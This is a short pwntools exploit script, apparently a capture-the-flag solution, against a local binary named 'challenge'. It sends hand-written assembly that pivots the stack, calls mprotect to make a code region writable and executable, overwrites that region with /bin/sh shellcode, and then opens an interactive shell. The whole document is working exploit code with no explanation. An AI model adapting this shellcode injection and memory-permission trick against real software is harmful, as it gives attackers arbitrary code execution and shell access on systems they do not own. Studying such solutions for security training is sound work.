from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('challenge')
libc = elf.libc

p = elf.process()

binsh = asm(shellcraft.sh())
block_sh = [binsh[i:i+8][::-1].hex() for i in range(0, len(binsh), 8)]

sc = '''
nop; nop; nop; nop
lea rsp, [rip-0x3b]

mov rdi, [rsp+0x6a8]
sub rdi, 0x14de

mov rdx, 7
mov rsi, 0x5000
mov rax, 0xa
syscall

lea r12, [rdi]
add r12, 0x156d
'''

for sh in block_sh:
    sc += 'xor rax, rax\n'
    sc += 'mov rax, 0x%s\n' % sh
    sc += 'mov [r12], rax\n'
    sc += 'add r12, 8\n'

sc += """
mov rax, 60
syscall
"""

p.sendafter(b'code: ', asm(sc))
p.interactive()